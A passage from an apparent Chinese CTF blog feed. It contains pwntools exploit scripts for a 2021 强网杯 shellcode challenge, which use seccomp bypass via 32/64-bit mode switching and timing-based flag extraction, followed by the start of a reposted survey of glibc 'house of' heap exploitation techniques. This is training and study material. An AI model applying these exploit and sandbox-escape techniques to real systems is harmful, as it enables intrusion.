class="hljs-string">/* 用异或运算来解决这个问题: 0x0f = 0x5d^0x52, 0x05 = 0x5f^0x5a. */</span><br><span class="hljs-string">/* 其中 0x52,0x5a 由 append 提供. */</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x31],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x32],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x22 /*set rcx*/</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40/*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x49</span><br><span class="hljs-string">'''</span><br>shellcode_read = <span class="hljs-string">'''</span><br><span class="hljs-string">/*read(0,0x40404040,0x70)*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40404040 /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdi*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40 /*set rdx*/</span><br><span class="hljs-string">push 0x70</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x57],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x58],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rdx /*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x70</span><br><span class="hljs-string">'''</span><br><br>shellcode_retfq = <span class="hljs-string">'''</span><br><span class="hljs-string">/*mode_64 -&gt; mode_32*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x72</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x40],cl</span><br><span class="hljs-string">push 0x68</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x40],cl</span><br><span class="hljs-string">push 0x47</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x41],cl</span><br><span class="hljs-string">push 0x48</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x41],cl</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push 0x40404040</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">'''</span><br><br><span class="hljs-comment"># mmap</span><br>shellcode += shellcode_mmap<br>shellcode += append<br><br><span class="hljs-comment"># read shellcode</span><br>shellcode += shellcode_read<br>shellcode += append<br><br><span class="hljs-comment"># mode_64 -&gt; mode_32</span><br>shellcode += shellcode_retfq<br>shellcode += append<br><br>shellcode = asm(shellcode,arch = <span class="hljs-string">'amd64'</span>,os = <span class="hljs-string">'linux'</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode))<br><br><span class="hljs-comment">#gdb.attach(p,"b *0x40027f\nb*0x4002eb\nc\nc\nsi\n")</span><br>p.sendline(shellcode)<br>pause()<br><br>p.sendline(shellcode_x86 + <span class="hljs-number">0x29</span>*<span class="hljs-string">'\x90'</span> + shellcode_flag)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h3 id="R-缺-OW-例题-2021-强网杯-初赛-shellcode"><a href="#R-缺-OW-例题-2021-强网杯-初赛-shellcode" class="headerlink" title="R 缺 OW (例题: 2021-强网杯-初赛-shellcode)"></a>R 缺 OW (例题: 2021-强网杯-初赛-shellcode)</h3><p>这道题其实就是 “R 缺 OW”，上面两种情况的融合怪。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># context.log_level = 'debug'</span><br><br>append_x86 = <span class="hljs-string">'''</span><br><span class="hljs-string">push ebx</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string">'''</span><br>append = <span class="hljs-string">'''</span><br><span class="hljs-string">push rdx</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">'''</span><br><br>shellcode_x86 = <span class="hljs-string">'''</span><br><span class="hljs-string">/*fp = open("flag")*/</span><br><span class="hljs-string">mov esp,0x40404140</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* s = "flag" */</span><br><span class="hljs-string">push 0x67616c66</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ebx = &amp;s */</span><br><span class="hljs-string">push esp</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ecx = 0 */</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov ecx,eax</span><br><span class="hljs-string">'''</span><br>shellcode_x86 = asm(shellcode_x86)<br><br>shellcode_mmap = <span class="hljs-string">'''</span><br><span class="hljs-string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span><br><span class="hljs-string">push 0x40404040 /*set rdi*/</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x7e /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdx*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x47</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set r8*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop r8</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rax /*set r9*/</span><br><span class="hljs-string">pop r9</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x31],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x32],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x22 /*set rcx*/</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40/*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x49</span><br><span class="hljs-string">'''</span><br>shellcode_read = <span class="hljs-string">'''</span><br><span class="hljs-string">/*read(0,0x40404040,0x70)*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40404040 /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdi*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40 /*set rdx*/</span><br><span class="hljs-string">push 0x70</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push 0x5d</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x57],cl</span><br><span class="hljs-string">push 0x5f</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x58],cl</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rdx /*set rax*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x70</span><br><span class="hljs-string">'''</span><br><br>shellcode_retfq = <span class="hljs-string">'''</span><br><span class="hljs-string">/*mode_64 -&gt; mode_32*/</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x72</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x40],cl</span><br><span class="hljs-string">push 0x68</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">xor byte ptr[rax+0x40],cl</span><br><span class="hljs-string">push 0x47</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x41],cl</span><br><span class="hljs-string">push 0x48</span><br><span class="hljs-string">pop rcx</span><br><span class="hljs-string">sub byte ptr[rax+0x41],cl</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push rdi</span><br><span class="hljs-string">push 0x23</span><br><span class="hljs-string">push 0x40404040</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">'''</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p, index, ch</span>):<br>    shellcode = <span class="hljs-string">''</span><br><br>    <span class="hljs-comment"># mmap</span><br>    shellcode += shellcode_mmap<br>    shellcode += append<br><br>    <span class="hljs-comment"># read shellcode</span><br>    shellcode += shellcode_read<br>    shellcode += append<br><br>    <span class="hljs-comment"># mode_64 -&gt; mode_32</span><br>    shellcode += shellcode_retfq<br>    shellcode += append<br><br>    shellcode = asm(shellcode,arch = <span class="hljs-string">'amd64'</span>,os = <span class="hljs-string">'linux'</span>)<br>    <span class="hljs-comment">#print hex(len(shellcode))</span><br><br>    p.sendline(shellcode)<br>    time.sleep(<span class="hljs-number">0.05</span>)<br><br>    shellcode_flag =<span class="hljs-string">"""</span><br><span class="hljs-string">    push 0x33</span><br><span class="hljs-string">    push 0x40404089</span><br><span class="hljs-string">    retfq</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    /*read(fp,buf,0x70)*/</span><br><span class="hljs-string">    mov rdi,rcx</span><br><span class="hljs-string">    mov rsi,rsp</span><br><span class="hljs-string">    mov rdx,0x70</span><br><span class="hljs-string">    xor rax,rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    loop:</span><br><span class="hljs-string">    cmp byte ptr[rsi+{0}], {1}</span><br><span class="hljs-string">    jz loop</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">    """</span>.<span class="hljs-built_in">format</span>(index, ch)<br>    shellcode_flag = asm(shellcode_flag,arch = <span class="hljs-string">'amd64'</span>,os = <span class="hljs-string">'linux'</span>)<br><br>    p.sendline(shellcode_x86 + <span class="hljs-number">0x29</span>*<span class="hljs-string">'\x90'</span> + shellcode_flag)<br><br>flag = <span class="hljs-string">""</span><br>index = <span class="hljs-number">0</span><br>last = <span class="hljs-string">'a'</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    update = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        sh = process(<span class="hljs-string">"./shellcode"</span>)<br>        pwn(sh, index, ch)<br>        start = time.time()<br>        <span class="hljs-keyword">try</span>:<br>            sh.recv(timeout=<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        end = time.time()<br>        sh.close()<br>        <span class="hljs-keyword">if</span>(end-start &gt; <span class="hljs-number">1.5</span>):<br>            flag += <span class="hljs-built_in">chr</span>(ch)<br>            last = <span class="hljs-built_in">chr</span>(ch)<br>            update = <span class="hljs-literal">True</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[ flag + 1 !!! ] "</span> + flag)<br>            <span class="hljs-keyword">break</span><br>    <br>    <span class="hljs-keyword">assert</span>(update == <span class="hljs-literal">True</span>)<br>    <br>    <span class="hljs-keyword">if</span>(last == <span class="hljs-string">'}'</span>):<br>        <span class="hljs-keyword">break</span><br>    <br>    index += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">"flag: "</span> + flag)<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近复现强网杯2021赛题[shellcode]有感，特意来学习一下有关orw原理中缺少某些函数的情况如何进行ORW&lt;br&gt;禁用沙箱规则我在之前提到过 [[prctl-seccomp]]&lt;br&gt;参考了大佬!&lt;a href=&quot;https://www.jianshu.com/p</summary>
      
    
    
    
    <category term="pwn 进阶" scheme="https://kylinxin.github.io/categories/pwn-%E8%BF%9B%E9%98%B6/"/>
    
    
    <category term="orw" scheme="https://kylinxin.github.io/tags/orw/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://kylinxin.github.io/2023/11/26/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/"/>
    <id>https://kylinxin.github.io/2023/11/26/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/</id>
    <published>2023-11-26T02:17:40.844Z</published>
    <updated>2023-11-26T02:33:21.986Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Glibc堆利用之house of 系列</title>
    <link href="https://kylinxin.github.io/2023/11/25/Glibc%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse%20of%20%E7%B3%BB%E5%88%97/"/>
    <id>https://kylinxin.github.io/2023/11/25/Glibc%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse%20of%20%E7%B3%BB%E5%88%97/</id>
    <published>2023-11-25T15:14:29.000Z</published>
    <updated>2023-11-26T07:17:41.049Z</updated>
    
    <content type="html"><![CDATA[<p>转载自<a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#1-%E5%89%8D%E8%A8%80">Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.cn)</a></p><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 - 前言"></a>1 - 前言</h1><p><code>Glibc</code> 的 <code>house of</code> 系列攻击手法基于都是围绕着堆利用和 <code>IO FILE</code> 利用。还有很多堆利用手法也非常经典，但是由于其没有被冠以 <code>house of xxxx</code>，故没有收录到本文中。如果想学习所有的详细的堆攻击手法，强烈建议 <code>follow</code> 仓库 <a href="https://github.com/shellphish/how2heap">how2heap</a>进行学习。我相信，只要把 <code>how2heap</code> 里面的每一个堆利用手法都学懂学透了，<code>glibc</code> 堆利用你将尽在掌握。</p><p>在开始系列总结之前，我会给出一个表格，表格里面分别是 <code>house of xxxx</code> 和对应的优秀的解析文章，在此非常感谢各位师傅们的总结。如果你在阅读本文的过程中想完整地查看某一个手法地详细利用过程，那么可以直接回到表格，点击对应的链接进行学习。目前的最新版本为 <code>2.37</code>，但是，目前的 <code>ubuntu:23.04</code> 还没开始用 <code>glibc-2.37</code>，使用的仍然是 <code>glibc-2.36</code>。</p><p>如果还有哪些 <code>house of xxxx</code> 的利用手法没有收录进来，或你对本文存有一些疑问，或者你发现本文某些内容编写错误，还请留言指正。</p><p>需要注意的是，除了关注各种 <code>house of</code> 利用技巧本身，更重要的是，需要关注该利用技巧背后的思想和原理。如果你能从这一系列的利用手法中提炼出一些通用的攻击向量或者攻击思想，日后在面对其他的场景，你也能更快的找到系统的漏洞点并加以利用。学习 <code>glibc</code> 堆利用更多的是为了举一反三，为了更好地掌握漏洞挖掘模式、漏洞分析方法，而不仅仅是为了比赛。</p><p><code>house of</code> 系列的表格如下，适用版本不考虑低于 <code>glibc-2.23</code> 的版本。我将在下文中进一步阐述每一个利用手法的原理、使用场景与适用范围。</p><table><thead><tr><th>攻击方法</th><th>影响范围</th><th>学习链接</th></tr></thead><tbody><tr><td>house of spirit</td><td>2.23—— 至今</td><td><a href="https://www.anquanke.com/post/id/244158">堆利用系列之 house of spirit - 安全客 - 安全资讯平台 (anquanke.com)</a></td></tr><tr><td>house of einherjar</td><td>2.23—— 至今</td><td><a href="https://www.anquanke.com/post/id/251596">PWN——House Of Einherjar CTF Wiki 例题详解 - 安全客 - 安全资讯平台 (anquanke.com)</a></td></tr><tr><td>house of force</td><td>2.23——2.29</td><td><a href="https://www.anquanke.com/post/id/175630">Top chunk 劫持：House of force 攻击 - 安全客 - 安全资讯平台 (anquanke.com)</a></td></tr><tr><td>house of lore</td><td>2.23—— 至今</td><td><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-lore/">House of Lore - CTF Wiki (ctf-wiki.org)</a></td></tr><tr><td>house of orange</td><td>2.23——2.26</td><td><a href="https://www.anquanke.com/post/id/218887">House of orange - 安全客 - 安全资讯平台 (anquanke.com)</a></td></tr><tr><td>house of rabbit</td><td>2.23——2.28</td><td><a href="http://p4nda.top/2018/04/18/house-of-rabbit/">http://p4nda.top/2018/04/18/house-of-rabbit/</a></td></tr><tr><td>house of roman</td><td>2.23——2.29</td><td><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-roman/">House of Roman - CTF Wiki (ctf-wiki.org)</a></td></tr><tr><td>house of storm</td><td>2.23——2.29</td><td><a href="https://www.anquanke.com/post/id/203096">House of storm 原理及利用 - 安全客 - 安全资讯平台 (anquanke.com)</a></td></tr><tr><td>house of corrosion</td><td>2.23—— 至今</td><td><a href="https://xz.aliyun.com/t/6862#toc-5">House-of-Corrosion 一种新的堆利用技巧 - 先知社区 (aliyun.com)</a></td></tr><tr><td>house of husk</td><td>2.23—— 至今</td><td><a href="https://www.anquanke.com/post/id/202387">house-of-husk 学习笔记 - 安全客 - 安全资讯平台 (anquanke.com)</a></td></tr><tr><td>house of atum</td><td>2.26——2.30</td><td><a href="https://abf1ag.github.io/2021/06/11/house-of-atum/">https://abf1ag.github.io/2021/06/11/house-of-atum/</a></td></tr><tr><td>house of kauri</td><td>2.26——2.32</td><td><a href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#house-of-kauri">Overview of GLIBC heap exploitation techniques (0x434b.dev)</a></td></tr><tr><td>house of fun</td><td>2.23——2.30</td><td><a href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#house-of-fun">Overview of GLIBC heap exploitation techniques (0x434b.dev)</a></td></tr><tr><td>house of mind</td><td>2.23—— 至今</td><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_mind_fastbin.c">how2heap/house_of_mind_fastbin.c at master · shellphish/how2heap (github.com)</a></td></tr><tr><td>house of muney</td><td>2.23—— 至今</td><td><a href="https://www.anquanke.com/post/id/254797">House of Muney 分析 - 安全客 - 安全资讯平台 (anquanke.com)</a></td></tr><tr><td>house of botcake</td><td>2.23—— 至今</td><td><a href="https://forum.butian.net/share/1709">奇安信攻防社区 - 深入理解 House of Botcake 堆利用手法 (butian.net)</a></td></tr><tr><td>house of rust</td><td>2.26—— 至今</td><td><a href="https://github.com/c4ebt/House-of-Rust">c4ebt/House-of-Rust</a></td></tr><tr><td>house of crust</td><td>2.26——2.37</td><td><a href="https://github.com/c4ebt/House-of-Rust">c4ebt/House-of-Rust</a></td></tr><tr><td>house of io</td><td>2.26—— 至今</td><td><a href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#house-of-io">Overview of GLIBC heap exploitation techniques (0x434b.dev)</a></td></tr><tr><td>house of banana</td><td>2.23—— 至今</td><td><a href="https://www.anquanke.com/post/id/222948">house of banana - 安全客 - 安全资讯平台 (anquanke.com)</a></td></tr><tr><td>house of kiwi</td><td>2.23——2.36</td><td><a href="https://www.anquanke.com/post/id/235598">House OF Kiwi - 安全客 - 安全资讯平台 (anquanke.com)</a></td></tr><tr><td>house of emma</td><td>2.23—— 至今</td><td><a href="https://www.anquanke.com/post/id/260614">house of emma</a></td></tr><tr><td>house of pig</td><td>2.23—— 至今</td><td><a href="https://www.anquanke.com/post/id/242640">house of pig 一个新的堆利用详解 - 安全客 - 安全资讯平台 (anquanke.com)</a></td></tr><tr><td>house of obstack</td><td>2.23—— 至今</td><td><a href="https://tttang.com/archive/1845/">一条新的 glibc IO_FILE 利用链：_IO_obstack_jumps 利用分析 - 跳跳糖 (tttang.com)</a></td></tr><tr><td>house of apple1</td><td>2.23—— 至今</td><td><a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/">House of Apple 一种新的 glibc 中 IO 攻击方法 (1) - roderick - record and learn! (roderickchan.cn)</a></td></tr><tr><td>house of apple2</td><td>2.23—— 至今</td><td><a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple 一种新的 glibc 中 IO 攻击方法 (2) - roderick - record and learn! (roderickchan.cn)</a></td></tr><tr><td>house of apple3</td><td>2.23—— 至今</td><td><a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/">House of Apple 一种新的 glibc 中 IO 攻击方法 (3) - roderick - record and learn! (roderickchan.cn)</a></td></tr><tr><td>house of gods</td><td>2.23——2.27</td><td><a href="https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT">house-of-gods/HOUSE_OF_GODS.TXT at master · Milo-D/house-of-gods (github.com)</a></td></tr></tbody></table><p>此外，阅读下文之前需要了解：</p><ul><li>下面所述的 <code>chunk A</code>，地址 <code>A</code> 指的是 <code>chunk header</code> 地址，而不是 <code>user data</code> 地址。</li><li>漏洞成因基本上都是堆溢出、<code>UAF</code> 等</li></ul><h1 id="2-house-of-系列"><a href="#2-house-of-系列" class="headerlink" title="2-house of 系列"></a>2-house of 系列</h1><h2 id="2-1-house-of-spirit"><a href="#2-1-house-of-spirit" class="headerlink" title="2.1-house of spirit"></a>2.1-house of spirit</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写</p><h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li></ul><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用堆溢出，修改 <code>chunk size</code>，伪造出 <code>fake chunk</code>，然后通过堆的释放和排布，控制 <code>fake chunk</code>。<code>house of spirit</code> 的操作思路有很多，比如可以按如下操作进行利用：</p><ul><li>申请 <code>chunk A、chunk B、chunk C、chunk D</code></li><li>对 <code>A</code> 写操作的时候溢出，修改 <code>B</code> 的 <code>size</code> 域，使其能包括 <code>chunk C</code></li><li>释放 <code>B</code>，然后把 <code>B</code> 申请回来，再释放 <code>C</code>，则可以通过读写 <code>B</code> 来控制 <code>C</code> 的内容</li></ul><h3 id="相关技巧"><a href="#相关技巧" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>起初 <code>house of spirit</code> 主要是针对 <code>fastbin</code>，后来引入了 <code>tcachebin</code> 后，也可以使用 <code>tcachebin</code> 版本的 <code>house of spirit</code>。利用方法与 <code>fastbin</code> 场景下类似，注意好不同版本下的检查条件即可。</p><h3 id="利用效果"><a href="#利用效果" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>劫持 <code>fastbin/tcachebin</code> 的 <code>fd</code> 之后，可以任意地址分配、任意地址读写</li></ul><h2 id="2-2-house-of-einherjar"><a href="#2-2-house-of-einherjar" class="headerlink" title="2.2-house of einherjar"></a>2.2-house of einherjar</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>溢出写、<code>off by one</code>、<code>off by null</code></p><h3 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可分配大于处于 <code>unsortedbin</code> 的 <code>chunk</code></li></ul><h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用 <code>off by null</code> 修改掉 <code>chunk</code> 的 <code>size</code> 域的 <code>P</code> 位，绕过 <code>unlink</code> 检查，在堆的后向合并过程中构造出 <code>chunk 